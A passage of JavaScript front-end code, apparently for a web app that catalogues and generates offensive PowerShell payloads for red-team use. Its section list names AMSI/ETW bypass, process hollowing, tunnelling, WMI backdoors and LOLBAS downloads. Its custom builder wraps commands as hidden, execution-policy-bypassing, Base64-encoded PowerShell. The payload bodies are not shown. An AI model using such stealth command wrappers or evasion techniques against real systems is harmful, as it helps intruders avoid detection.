                document.getElementById('sidebar').classList.add('active');
            }

            // Swipe left to close sidebar
            if (distX < -100 && Math.abs(distY) < 100 && window.innerWidth <= 1024) {
                document.getElementById('sidebar').classList.remove('active');
            }

            startX = startY = distX = distY = null;
        });
    }

    setupKeyboardShortcuts() {
        document.addEventListener('keydown', (e) => {
            // Ctrl/Cmd + K for search
            if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
                e.preventDefault();
                document.getElementById('searchInput').focus();
            }
            
            // Ctrl/Cmd + Enter to generate payload (when in custom builder)
            if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
                if (document.activeElement.id === 'customCommand') {
                    this.buildCustomPayload();
                }
            }
            
            // Arrow key navigation in sections
            if (e.key === 'ArrowLeft' || e.key === 'ArrowRight') {
                const sections = Object.keys(this.getSectionMap());
                const currentIndex = sections.indexOf(this.currentSection);
                
                if (currentIndex !== -1 && (e.ctrlKey || e.metaKey)) {
                    e.preventDefault();
                    let newIndex;
                    if (e.key === 'ArrowLeft') {
                        newIndex = currentIndex > 0 ? currentIndex - 1 : sections.length - 1;
                    } else {
                        newIndex = currentIndex < sections.length - 1 ? currentIndex + 1 : 0;
                    }
                    this.loadSection(sections[newIndex]);
                }
            }

            // Numbers 1-9 for quick section switching
            if (e.key >= '1' && e.key <= '9' && (e.ctrlKey || e.metaKey)) {
                e.preventDefault();
                const sections = Object.keys(this.getSectionMap());
                const index = parseInt(e.key) - 1;
                if (index < sections.length) {
                    this.loadSection(sections[index]);
                }
            }
        });
    }

    setupTooltips() {
        // Simple tooltip implementation
        document.querySelectorAll('[title]').forEach(element => {
            element.addEventListener('mouseenter', (e) => {
                this.showTooltip(e.target, e.target.getAttribute('title'));
            });
            
            element.addEventListener('mouseleave', () => {
                this.hideTooltip();
            });
        });
    }

    loadSection(sectionId) {
        // Update navigation
        document.querySelectorAll('.nav-item').forEach(item => {
            item.classList.remove('active');
        });
        const navItem = document.querySelector(`[data-section="${sectionId}"]`);
        if (navItem) navItem.classList.add('active');

        // Update content
        document.querySelectorAll('.content-section').forEach(section => {
            section.classList.remove('active');
        });
        const section = document.getElementById(sectionId);
        if (section) section.classList.add('active');

        this.currentSection = sectionId;

        // Generate content for the section
        this.generateSectionContent(sectionId);

        // Close mobile menu
        if (window.innerWidth <= 1024) {
            document.getElementById('sidebar').classList.remove('active');
        }

        // Update URL without page reload
        history.pushState({section: sectionId}, '', `#${sectionId}`);
    }

    getSectionMap() {
        return {
            basic: ['sysinfo', 'processes', 'services', 'network'],
            filesystem: ['listfiles', 'findfiles', 'credentials_search'],
            security: ['currentuser', 'localusers', 'groups', 'privileges'],
            advanced: ['encoded', 'oneliner', 'registry', 'eventlogs'],
            edr: ['amsibypass', 'etw_bypass', 'scriptblock_bypass', 'constrained_bypass', 'reflective_loading', 'obfuscated_invoke'],
            memory: ['memory_patching', 'syscall_direct', 'heaven_gate', 'manual_dll_loading', 'process_hollowing'],
            network: ['dns_tunneling', 'icmp_tunnel', 'tcp_beacon', 'http_tunnel'],
            persistence: ['wmi_backdoor', 'scheduled_task_stealth', 'image_file_execution', 'service_persistence'],
            analysis: ['timing_evasion', 'mouse_movement', 'vm_detection', 'debugger_detection'],
            encryption: ['chacha20_encryption', 'polymorphic_shellcode', 'string_encryption'],
            lolbas: ['certutil_download', 'bitsadmin_download', 'regsvr32_bypass', 'mshta_execution']
        };
    }

    generateSectionContent(sectionId) {
        const sectionPayloads = this.getPayloadsBySection(sectionId);
        const section = document.getElementById(sectionId);
        
        if (!section || sectionId === 'custom') return;

        const grid = section.querySelector('.payload-grid');
        if (!grid) return;

        grid.innerHTML = '';

        sectionPayloads.forEach(([key, payload]) => {
            const card = this.createPayloadCard(key, payload);
            grid.appendChild(card);
        });

        // Update section count
        const countElement = section.querySelector('.section-count');
        if (countElement) {
            countElement.textContent = `${sectionPayloads.length} techniques`;
        }
    }

    getPayloadsBySection(sectionId) {
        const sectionMap = this.getSectionMap();
        const payloadKeys = sectionMap[sectionId] || [];
        return payloadKeys.map(key => [key, payloads[key]]).filter(([key, payload]) => payload);
    }

    createPayloadCard(key, payload) {
        const card = document.createElement('div');
        card.className = 'payload-card';
        card.dataset.complexity = payload.complexity;
        card.dataset.platform = payload.platform;

        const isFavorite = this.favorites.includes(key);

        card.innerHTML = `
            <div class="card-header">
                <h3>${this.formatTitle(key)}</h3>
                <div class="card-badges">
                    <span class="complexity-badge ${payload.complexity}">${payload.complexity}</span>
                    ${payload.evasion_rating ? `<span class="evasion-badge">${'★'.repeat(payload.evasion_rating)}</span>` : ''}
                </div>
            </div>
            <p class="card-description">${payload.description}</p>
            ${payload.warning ? `<div class="card-warning"><i class="fas fa-exclamation-triangle"></i> ${payload.warning}</div>` : ''}
            <div class="card-tags">
                ${payload.tags ? payload.tags.slice(0, 3).map(tag => `<span class="tag">${tag}</span>`).join('') : ''}
            </div>
            <div class="card-actions">
                <button class="btn-primary" onclick="app.generatePayload('${key}')">
                    <i class="fas fa-play"></i> Generate
                </button>
                <button class="btn-secondary" onclick="app.showPayloadDetails('${key}')">
                    <i class="fas fa-info"></i> Details
                </button>
                <button class="btn-icon ${isFavorite ? 'active' : ''}" onclick="app.toggleFavorite('${key}')" title="${isFavorite ? 'Remove from favorites' : 'Add to favorites'}">
                    <i class="fas fa-heart"></i>
                </button>
            </div>
        `;

        return card;
    }

    formatTitle(key) {
        return key.split('_').map(word => 
            word.charAt(0).toUpperCase() + word.slice(1)
        ).join(' ');
    }

    generatePayload(type) {
        const payload = payloads[type];
        if (!payload) return;

        // Add to history
        this.addToHistory(type, payload);

        // Show output panel with animation
        const outputPanel = document.getElementById('outputPanel');
        outputPanel.classList.add('active');

        // Update output content
        document.getElementById('payloadOutput').textContent = payload.command;
        document.getElementById('description').textContent = payload.description;
        
        // Update metadata with enhanced information
        const metadata = document.getElementById('metadata');
        metadata.innerHTML = `
            <div class="metadata-grid">
                <div class="metadata-item">
                    <strong>Complexity:</strong> <span class="complexity-${payload.complexity}">${payload.complexity}</span>
                </div>
                <div class="metadata-item">
                    <strong>Platform:</strong> ${payload.platform}
                </div>
                <div class="metadata-item">
                    <strong>Category:</strong> ${payload.category || 'General'}
                </div>
                <div class="metadata-item">
                    <strong>MITRE ATT&CK:</strong> ${payload.mitre_id || 'N/A'}
                </div>
                <div class="metadata-item">
                    <strong>Detection Difficulty:</strong> ${payload.detection_difficulty || 'Unknown'}
                </div>
                <div class="metadata-item">
                    <strong>Evasion Rating:</strong> ${'★'.repeat(payload.evasion_rating || 1)}${'☆'.repeat(5 - (payload.evasion_rating || 1))}
                </div>
                <div class="metadata-item">
                    <strong>Author:</strong> ${payload.author}
                </div>
                <div class="metadata-item">
                    <strong>Generated:</strong> ${new Date().toLocaleString()}
                </div>
                ${payload.warning ? `<div class="metadata-warning"><i class="fas fa-exclamation-triangle"></i> ${payload.warning}</div>` : ''}
            </div>
        `;

        // Apply syntax highlighting
        this.applySyntaxHighlighting();
        
        // Show success notification
        this.showNotification(`Payload "${this.formatTitle(type)}" generated successfully!`, 'success');
    }

    showPayloadDetails(type) {
        const payload = payloads[type];
        if (!payload) return;

        const modal = document.getElementById('detailsModal');
        const modalTitle = document.getElementById('modalTitle');
        const modalBody = document.getElementById('modalBody');

        modalTitle.textContent = this.formatTitle(type) + ' - Detailed Information';
        
        modalBody.innerHTML = `
            <div class="payload-details">
                <div class="detail-section">
                    <h4><i class="fas fa-info-circle"></i> Overview</h4>
                    <p>${payload.description}</p>
                </div>
                
                <div class="detail-section">
                    <h4><i class="fas fa-code"></i> Command</h4>
                    <div class="code-preview">
                        <pre><code>${payload.command}</code></pre>
                        <button class="copy-btn" onclick="app.copyText('${payload.command.replace(/'/g, '\\\'')}')" title="Copy command">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                </div>
                
                <div class="detail-section">
                    <h4><i class="fas fa-chart-line"></i> Technical Details</h4>
                    <div class="detail-grid">
                        <div class="detail-item">
                            <span class="label">Complexity:</span>
                            <span class="value complexity-${payload.complexity}">${payload.complexity}</span>
                        </div>
                        <div class="detail-item">
                            <span class="label">Platform:</span>
                            <span class="value">${payload.platform}</span>
                        </div>
                        <div class="detail-item">
                            <span class="label">Category:</span>
                            <span class="value">${payload.category || 'General'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="label">MITRE ATT&CK:</span>
                            <span class="value">${payload.mitre_id || 'N/A'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="label">Detection Difficulty:</span>
                            <span class="value">${payload.detection_difficulty || 'Unknown'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="label">Evasion Rating:</span>
                            <span class="value">${'★'.repeat(payload.evasion_rating || 1)}${'☆'.repeat(5 - (payload.evasion_rating || 1))}</span>
                        </div>
                    </div>
                </div>
                
                ${payload.tags ? `
                <div class="detail-section">
                    <h4><i class="fas fa-tags"></i> Tags</h4>
                    <div class="tags">
                        ${payload.tags.map(tag => `<span class="tag">${tag}</span>`).join('')}
                    </div>
                </div>
                ` : ''}
                
                ${payload.warning ? `
                <div class="detail-section warning-section">
                    <h4><i class="fas fa-exclamation-triangle"></i> Warning</h4>
                    <p class="warning-text">${payload.warning}</p>
                </div>
                ` : ''}
                
                <div class="detail-section">
                    <h4><i class="fas fa-book"></i> Usage Guidelines</h4>
                    <ul class="guidelines">
                        <li>Use only in authorized testing environments</li>
                        <li>Follow responsible disclosure practices</li>
                        <li>Ensure proper documentation of testing activities</li>
                        <li>Consider legal and ethical implications</li>
                        <li>Respect privacy and data protection regulations</li>
                    </ul>
                </div>
                
                <div class="detail-section">
                    <h4><i class="fas fa-shield-alt"></i> Detection Methods</h4>
                    <ul class="detection-methods">
                        ${this.getDetectionMethods(payload).map(method => `<li>${method}</li>`).join('')}
                    </ul>
                </div>
            </div>
        `;

        modal.classList.add('active');
    }

    getDetectionMethods(payload) {
        const detectionMap = {
            'basic': ['Process monitoring', 'Command line logging'],
            'intermediate': ['Behavioral analysis', 'Network monitoring', 'File system monitoring'],
            'advanced': ['Memory analysis', 'API hooking', 'Advanced behavioral detection'],
            'expert': ['Kernel-level monitoring', 'Hardware-based detection', 'Advanced threat hunting']
        };
        
        return detectionMap[payload.complexity] || ['Standard monitoring'];
    }

    buildCustomPayload() {
        const customCommand = document.getElementById('customCommand').value.trim();
        const encodeBase64 = document.getElementById('encodeBase64').checked;
        const hiddenWindow = document.getElementById('hiddenWindow').checked;
        const bypassPolicy = document.getElementById('bypassPolicy').checked;
        
        if (!customCommand) {
            this.showNotification('Please enter a PowerShell command first.', 'warning');
            return;
        }
        
        let finalPayload = customCommand;
        let description = 'Custom PowerShell command';
        
        // Build the command with options
        let commandArgs = [];
        
        if (hiddenWindow) {
            commandArgs.push('-WindowStyle Hidden');
            description += ' (hidden window)';
        }
        
        if (bypassPolicy) {
            commandArgs.push('-ExecutionPolicy Bypass');
            description += ' (bypass execution policy)';
        }
        
        if (encodeBase64) {
            // Convert to Base64
            const encoded = btoa(unescape(encodeURIComponent(customCommand)));
            finalPayload = `powershell.exe ${commandArgs.join(' ')} -EncodedCommand ${encoded}`;
            description += ' (Base64 encoded)';
        } else {
            finalPayload = `powershell.exe ${commandArgs.join(' ')} -Command "${customCommand}"`;
        }
        
        // Show output
        const outputPanel = document.getElementById('outputPanel');
        outputPanel.classList.add('active');
        
        document.getElementById('payloadOutput').textContent = finalPayload;
        document.getElementById('description').textContent = description;
        document.getElementById('metadata').innerHTML = `
            <div class="metadata-grid">
                <div class="metadata-item">
                    <strong>Type:</strong> Custom Payload
                </div>
                <div class="metadata-item">
                    <strong>Generated:</strong> ${new Date().toLocaleString()}
                </div>
                <div class="metadata-item">
                    <strong>Author:</strong> User (0x0806 Platform)
                </div>
                <div class="metadata-item">
                    <strong>Options:</strong> ${[
                        hiddenWindow ? 'Hidden Window' : null,
                        bypassPolicy ? 'Bypass Policy' : null,
                        encodeBase64 ? 'Base64 Encoded' : null
                    ].filter(Boolean).join(', ') || 'None'}
                </div>
            </div>
        `;

        this.applySyntaxHighlighting();
        this.showNotification('Custom payload generated successfully!', 'success');
    }

    performSearch(term) {
        this.searchTerm = term.toLowerCase();
        this.filterPayloads();
        
        // Highlight search results
        if (term) {
            this.highlightSearchResults(term);
        }
    }

    filterPayloads() {
        const cards = document.querySelectorAll('.payload-card');
        let visibleCount = 0;
        
        cards.forEach(card => {
            const title = card.querySelector('h3').textContent.toLowerCase();
            const description = card.querySelector('.card-description').textContent.toLowerCase();
            const tags = Array.from(card.querySelectorAll('.tag')).map(tag => tag.textContent.toLowerCase());
            const complexity = card.dataset.complexity;
            const platform = card.dataset.platform;
            
            const matchesSearch = !this.searchTerm || 
                title.includes(this.searchTerm) || 
                description.includes(this.searchTerm) ||
                tags.some(tag => tag.includes(this.searchTerm));
            
            const matchesComplexity = this.activeFilters.complexity.includes(complexity);
            const matchesPlatform = this.activeFilters.platform.includes(platform);
            
            if (matchesSearch && matchesComplexity && matchesPlatform) {
                card.style.display = 'block';
                visibleCount++;
            } else {
                card.style.display = 'none';
            }
        });

        // Update section count
        const countElement = document.querySelector(`#${this.currentSection} .section-count`);
        if (countElement) {
            countElement.textContent = `${visibleCount} techniques`;
        }
    }

    highlightSearchResults(term) {
        if (!term) return;
        
        document.querySelectorAll('.payload-card:not([style*="none"])').forEach(card => {
            const elements = card.querySelectorAll('h3, .card-description');
            elements.forEach(element => {
                const originalText = element.dataset.originalText || element.textContent;
                element.dataset.originalText = originalText;
                
                const regex = new RegExp(`(${term})`, 'gi');
                element.innerHTML = originalText.replace(regex, '<mark>$1</mark>');
            });
        });
    }

    updateFilters() {
        const complexityFilters = Array.from(document.querySelectorAll('.filter-option input[value^="basic"], .filter-option input[value^="intermediate"], .filter-option input[value^="advanced"], .filter-option input[value^="expert"]'))
            .filter(input => input.checked)
            .map(input => input.value);
        
        const platformFilters = Array.from(document.querySelectorAll('.filter-option input[value^="windows"], .filter-option input[value^="linux"], .filter-option input[value^="macos"]'))
            .filter(input => input.checked)
            .map(input => input.value);

        this.activeFilters = {
            complexity: complexityFilters,
            platform: platformFilters
        };
    }

    toggleTheme() {
        this.currentTheme = this.currentTheme === 'dark' ? 'light' : 'dark';
        this.updateTheme();
        
        // Update icon
        const icon = document.querySelector('#themeToggle i');
        icon.className = this.currentTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
        
        // Save preference
        localStorage.setItem('theme', this.currentTheme);
        
        this.showNotification(`Switched to ${this.currentTheme} theme`, 'info');
    }

    updateTheme() {
        document.documentElement.setAttribute('data-theme', this.currentTheme);
    }

    toggleMobileMenu() {
        document.getElementById('sidebar').classList.toggle('active');
    }

    toggleFilters(show = null) {
        const panel = document.getElementById('filterPanel');
        if (show === null) {
            panel.classList.toggle('active');
        } else if (show) {
            panel.classList.add('active');
        } else {
            panel.classList.remove('active');
        }
    }

    toggleFavorite(payloadKey) {
        const index = this.favorites.indexOf(payloadKey);
        if (index > -1) {
            this.favorites.splice(index, 1);
            this.showNotification(`Removed from favorites`, 'info');
        } else {
            this.favorites.push(payloadKey);
            this.showNotification(`Added to favorites`, 'success');
        }
        
        localStorage.setItem('favorites', JSON.stringify(this.favorites));
        
        // Update UI
        this.generateSectionContent(this.currentSection);
    }

    addToHistory(type, payload) {
        const historyItem = {
            type,
            payload: payload.command,
            timestamp: new Date().toISOString(),
            description: payload.description
        };
        
        this.payloadHistory.unshift(historyItem);
        
        // Keep only last 50 items
        if (this.payloadHistory.length > 50) {
            this.payloadHistory = this.payloadHistory.slice(0, 50);
        }
        
        localStorage.setItem('payloadHistory', JSON.stringify(this.payloadHistory));
    }

    closeOutput() {
        document.getElementById('outputPanel').classList.remove('active');
    }

    closeModal() {
        document.getElementById('detailsModal').classList.remove('active');
    }

    applySyntaxHighlighting() {
        const codeElement = document.querySelector('#payloadOutput');
        if (!codeElement) return;
        
        let code = codeElement.textContent;
        
        // PowerShell syntax highlighting
        const patterns = [
            { pattern: /\b(Get-|Set-|New-|Remove-|Add-|Start-|Stop-|Invoke-|Import-|Export-)[A-Za-z]+/g, class: 'ps-cmdlet' },
            { pattern: /\$[A-Za-z_][A-Za-z0-9_]*/g, class: 'ps-variable' },
            { pattern: /-[A-Za-z]+/g, class: 'ps-parameter' },
            { pattern: /'[^']*'/g, class: 'ps-string' },
            { pattern: /"[^"]*"/g, class: 'ps-string' },
            { pattern: /\b(if|else|elseif|foreach|for|while|do|switch|function|param|begin|process|end)\b/g, class: 'ps-keyword' }
        ];
        
        patterns.forEach(({pattern, class: className}) => {
            code = code.replace(pattern, `<span class="${className}">$&</span>`);
        });
        
        codeElement.innerHTML = code;
    }

    copyToClipboard() {
        const output = document.getElementById('payloadOutput');
        const text = output.textContent;
        
        if (navigator.clipboard) {
            navigator.clipboard.writeText(text).then(() => {
                this.showNotification('Payload copied to clipboard!', 'success');
            }).catch(() => {
                this.fallbackCopyToClipboard(text);
            });
        } else {
            this.fallbackCopyToClipboard(text);
        }
    }

    copyText(text) {
        if (navigator.clipboard) {
            navigator.clipboard.writeText(text).then(() => {
                this.showNotification('Command copied to clipboard!', 'success');
            });
        } else {
            this.fallbackCopyToClipboard(text);
        }
    }

    fallbackCopyToClipboard(text) {
        const textArea = document.createElement('textarea');
        textArea.value = text;
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        textArea.style.top = '-999999px';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        
        try {
            document.execCommand('copy');
            this.showNotification('Copied to clipboard!', 'success');
        } catch (err) {
            this.showNotification('Failed to copy to clipboard', 'error');
        }
        
        document.body.removeChild(textArea);
    }

    downloadPayload() {
        const output = document.getElementById('payloadOutput');
        const text = output.textContent;
        const blob = new Blob([text], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        
        const a = document.createElement('a');
        a.href = url;
        a.download = `payload_${Date.now()}.ps1`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        this.showNotification('Payload downloaded successfully!', 'success');
    }

    showTooltip(element, text) {
        const tooltip = document.createElement('div');
        tooltip.className = 'tooltip';
        tooltip.textContent = text;
        document.body.appendChild(tooltip);
        
        const rect = element.getBoundingClientRect();
        tooltip.style.left = rect.left + (rect.width / 2) - (tooltip.offsetWidth / 2) + 'px';
        tooltip.style.top = rect.top - tooltip.offsetHeight - 8 + 'px';
        
        setTimeout(() => tooltip.classList.add('show'), 10);
    }

    hideTooltip() {
        const tooltip = document.querySelector('.tooltip');
        if (tooltip) {
            tooltip.remove();
        }
    }

    showNotification(message, type = 'info') {
        const notification = document.createElement('div');
        notification.className = `notification notification-${type}`;
        notification.innerHTML = `
            <div class="notification-content">
                <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : type === 'warning' ? 'exclamation-triangle' : 'info-circle'}"></i>
                <span>${message}</span>
            </div>
        `;
        
        document.body.appendChild(notification);
        
        setTimeout(() => notification.classList.add('show'), 100);
        
        setTimeout(() => {
            notification.classList.remove('show');
            setTimeout(() => {
                if (notification.parentNode) {
                    document.body.removeChild(notification);
                }
            }, 300);
        }, 3000);
    }
}

// Global functions for backward compatibility
function generatePayload(type) {
    app.generatePayload(type);
}

function buildCustomPayload() {
    app.buildCustomPayload();
}

function copyToClipboard() {
    app.copyToClipboard();
}

function downloadPayload() {
    app.downloadPayload();
}

function showPayloadDetails(type) {
    app.showPayloadDetails(type);
}

function closeOutput() {
    app.closeOutput();
}

function closeModal() {
    app.closeModal();
}

// Initialize application
const app = new PayloadArsenal();

// Handle browser back/forward buttons
window.addEventListener('popstate', (e) => {
    if (e.state && e.state.section) {
        app.loadSection(e.state.section);
    }
});

// Load section from URL hash on page load
window.addEventListener('load', () => {
    const hash = window.location.hash.substring(1);
    if (hash && app.getSectionMap()[hash]) {
        app.loadSection(hash);
    }
});

// Service Worker Registration for PWA capabilities
if ('serviceWorker' in navigator) {
    window.addEventListener('load', () => {
        navigator.serviceWorker.register('/sw.js').catch(() => {
            // Service worker registration failed, continue without PWA features
        });
    });
}
